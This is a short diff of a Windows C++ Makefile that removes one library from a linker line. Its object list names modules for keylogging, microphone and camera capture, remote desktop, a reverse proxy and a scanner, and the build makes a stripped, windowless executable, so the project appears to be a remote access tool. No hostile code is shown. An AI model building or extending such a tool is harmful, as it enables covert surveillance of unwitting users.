@@ -1,4 +1,4 @@
-LINK2=-lmfplat -lmfreadwrite -lnetapi32 -lmfuuid -lole32 -lmf -lwmcodecdspuuid -lstrmiids -luuid -lws2_32 -lwinmm -lwtsapi32 -lgdi32 -lgdiplus -lshlwapi -liphlpapi -lcrypt32 -lbcrypt -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic -mwindows
+LINK2=-lmfplat -lmfreadwrite -lnetapi32 -lmfuuid -lole32 -lmf -lwmcodecdspuuid -lstrmiids -luuid -lws2_32 -lwtsapi32 -lgdi32 -lgdiplus -lshlwapi -liphlpapi -lcrypt32 -lbcrypt -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic -mwindows
 LINK=-lmfplat -lmfreadwrite -lmfuuid -lole32 -lmf -lwmcodecdspuuid -lstrmiids -luuid -lws2_32 -lwinmm -lwtsapi32 -lgdi32 -lgdiplus -lshlwapi
 CFLAG=-Wall -Wextra -std=c++14 -Wpedantic
 OBJ=main.o misc.o cliente.o mod_mic.o mod_file_manager.o mod_keylogger.o mod_camara.o mod_remote_desktop.o mod_fun.o mod_escaner.o mod_ventanas.o mod_reverse_proxy.o mod_info.o
